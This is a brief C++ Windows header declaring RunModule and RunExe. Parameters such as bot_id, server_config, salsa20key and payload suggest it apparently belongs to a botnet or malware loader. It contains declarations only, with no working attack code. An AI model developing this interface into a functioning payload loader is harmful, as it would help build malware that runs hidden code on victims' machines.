#pragma once

#include <windows.h>
#include <string>

DWORD
RunModule(
    LPBYTE      module,       
    DWORD       module_size,  
    LPCWSTR     bot_id,       
    LPSTR    server_config,  
    LPBYTE      salsa20key,   
    LPVOID      reserved,     
    DWORD       reserved_size, 
    std::string& error_str,   
    LPDWORD     process_id     
);

DWORD
RunExe(
    LPBYTE      payload,      
    DWORD       payload_size,  
    LPCWSTR     cmdline,       
    std::string& error_str     
);
